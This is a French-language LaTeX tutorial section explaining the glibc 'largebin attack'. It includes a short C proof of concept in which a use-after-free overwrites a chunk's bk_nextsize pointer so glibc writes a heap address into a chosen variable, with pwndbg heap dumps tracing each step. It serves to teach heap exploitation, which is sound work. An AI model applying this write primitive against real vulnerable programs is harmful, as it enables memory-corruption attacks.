\subsubsection{Largebin Attack}

\noindent\textbf{Fichier de Référence :}
\href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/large_bin_attack.c}{\texttt{large\_bin\_attack.c}}

\noindent\textbf{Techniques similaires :}
\href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/house_of_tangerine.c}{\texttt{house\_of\_tangerine.c}},
\href{https://github.com/shellphish/how2heap/blob/master/glibc_2.41/house_of_water.c}{\texttt{house\_of\_water.c}}

\paragraph{Hypothèse :} Largebin, Use-After-Free, Heap Feng Shui.

\paragraph{Inconvénient :} On ne peut modifier la cible qu’avec des valeurs d’adresse.\\
Technique patchée à partir de la version 2.42 (\href{https://patchwork.sourceware.org/project/glibc/patch/20250214053454.2346370-1-benjamin.p.kallus.gr@dartmouth.edu/}{patch}).

L'idée de cette technique est de modifier la valeur d'une variable.
Pour ce faire, on utilise un bug de type use-after-free afin de substituer un pointeur
des métadonnées vers notre cible.
L’objectif final est de faire en sorte que le mécanisme interne de gestion des large bins
écrive une adresse contrôlée à un emplacement arbitraire.

Le code est le suivant :

\begin{minted}[frame=single, framesep=2mm, fontsize=\footnotesize, style=monokai, bgcolor=pwndbgbg]{c}
int main()
{
    /* Disable IO buffering to prevent stream from interfering with heap */
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    size_t target = 0;
    size_t *p1 = malloc(0x428);
    size_t *g1 = malloc(0x18);

    size_t *p2 = malloc(0x418);
    size_t *g2 = malloc(0x18);

    free(p1);
    size_t *g3 = malloc(0x438);

    free(p2);

    /* Overwrite metadata pointer */
    p1[3] = (size_t)((&target) - 4);

    size_t *g4 = malloc(0x438);

    assert((size_t)(p2 - 2) == target);

    return 0;
}
\end{minted}

Le code se décompose en deux phases :
\begin{itemize}
    \item remplissage de la heap ;
    \item manipulation de l'emplacement des chunks ;
\end{itemize}

\textbf{Remplissage :}

Dans un premier temps, on alloue deux chunks destinés au large bin avec deux gardes
pour empêcher la consolidation.
Ce qui permet de contrôler précisément leur placement dans les bins.

\begin{pwndbg}[heap]{text}
    Allocated chunk - PREV_INUSE
    Addr: !\textcolor{pwndbgred}{0x555555559290}!
    Size: 0x430 (with flag bits: 0x431)

    Allocated chunk - PREV_INUSE
    Addr: !\textcolor{pwndbgblue}{0x5555555596e0}!
    Size: 0x420 (with flag bits: 0x421)
\end{pwndbg}

\begin{pwndbg}[p \&target]{text}

    &target = (size_t *) 0x7fffffffd800

\end{pwndbg}

\textbf{Manipulation des emplacements :}

Lorsque l'on libère \texttt{p1}, il va dans l'unsorted bin. Pour déclencher le tri,
il faut allouer un chunk plus grand que lui (g3).

Une fois \texttt{p1} rangé, on libère \texttt{p2}, qui se retrouve alors dans l'unsorted bin.
Comme \texttt{p2} est légèrement plus petit que \texttt{p1}, il sera placé dans le même large bin
mais après comparaison de taille, ce qui déclenche la mise à jour des pointeurs
\texttt{fd\_nextsize} et \texttt{bk\_nextsize}.

C'est à ce moment que tout se joue, le pointeur \texttt{p1[3]} pointe le champ \texttt{bk\_nextsize}.
Ainsi, on remplace le champs \texttt{bk\_nextsize} de \texttt{p1}
par l’adresse \texttt{target - 0x20}.

Lors de l'insertion de \texttt{p2} dans le large bin, glibc veut mettre à jour
le champ \texttt{fd\_nextsize} du chunk qui est pointé par \texttt{bk\_nextsize}(mise à jour d’une liste chaînée),
et comme \texttt{bk\_nextsize} pointe sur le début du chunk, il a besoin d'avancer
au‑delà de \texttt{prev\_size}, \texttt{size}, \texttt{fd} et \texttt{bk},
ce qui fait 32~octets.
D'où le \texttt{0x20} qui est retiré à l'adresse de \texttt{target}.

Ainsi, pour que l’écriture de glibc tombe exactement sur \texttt{target}, il faut que \texttt{bk\_nextsize} contienne l’adresse \texttt{target - 0x20}.
Lors de la mise à jour, glibc écrit à :


\[
    (\text{pointeur falsifié}) + 0x20 = \texttt{target}
\]


L'adresse de \texttt{target - 0x20} = \textcolor{pwndbgbrown}{\texttt{0x7fffffffd7e0}}


\paragraph{État de p1 avant le tri de p2 :}
\begin{pwndbg}[heap]{text}
    Free chunk (largebins) -- PREV_INUSE
    Addr: !\textcolor{pwndbgred}{p1}!
    Size: 0x430 (with flag bits: 0x431)
    fd: !\textcolor{pwndbgpurple}{arena}!
    bk: !\textcolor{pwndbgpurple}{arena}!
    fd_nextsize: !\textcolor{pwndbgred}{p1}!
    bk_nextsize: !\textcolor{pwndbgbrown}{target - 0x20}!
\end{pwndbg}

\paragraph{État de p1 et p2 après le tri :}
\begin{pwndbg}[heap]{text}
    Free chunk (largebins) -- PREV_INUSE
    Addr: !\textcolor{pwndbgred}{p1}!
    Size: 0x430 (with flag bits: 0x431)
    fd: !\textcolor{pwndbgblue}{p2}!
    bk: !\textcolor{pwndbgpurple}{arena}!
    fd_nextsize: !\textcolor{pwndbgred}{p1}!
    bk_nextsize: !\textcolor{pwndbgblue}{p2}!


    Free chunk (largebins) -- PREV_INUSE
    Addr: !\textcolor{pwndbgblue}{p2}!
    Size: 0x420 (with flag bits: 0x421)
    fd: !\textcolor{pwndbgpurple}{arena}!
    bk: !\textcolor{pwndbgred}{p1}!
    fd_nextsize: !\textcolor{pwndbgred}{p1}!
    bk_nextsize: !\textcolor{pwndbgbrown}{target - 0x20}!
\end{pwndbg}


Une fois le tri de p2 effectué, l’adresse de p2 est écrite dans target.
Toutes ces manipulations visant à réussir à écrire p2 à cet emplacement
relèvent du heap feng shui.
Si l’on souhaite que l’adresse de p2 soit une adresse spécifique,
il suffit alors de manipuler les tailles des chunks et de connaître
l’adresse minimale possible (le début du heap).

